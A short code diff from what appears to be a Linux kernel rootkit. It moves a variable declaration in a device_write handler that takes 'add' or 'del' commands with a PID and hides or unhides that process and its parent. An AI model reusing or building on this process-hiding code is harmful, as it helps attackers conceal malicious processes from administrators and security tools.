@@ -209,6 +209,7 @@ static ssize_t device_write(struct file *filep,
                             loff_t *offset)
 {
     long pid;
+    pid_t ppid;
     char *message;
 
     char add_message[] = "add", del_message[] = "del";
@@ -221,12 +222,12 @@ static ssize_t device_write(struct file *filep,
     if (!memcmp(message, add_message, sizeof(add_message) - 1)) {
         kstrtol(message + sizeof(add_message), 10, &pid);
         hide_process(pid);
-	pid_t ppid = get_parent_pid(pid);
+	ppid = get_parent_pid(pid);
 	hide_process(ppid);
     } else if (!memcmp(message, del_message, sizeof(del_message) - 1)) {
         kstrtol(message + sizeof(del_message), 10, &pid);
         unhide_process(pid);
-	pid_t ppid = get_parent_pid(pid);
+	ppid = get_parent_pid(pid);
 	unhide_process(ppid);
     } else {
         kfree(message);
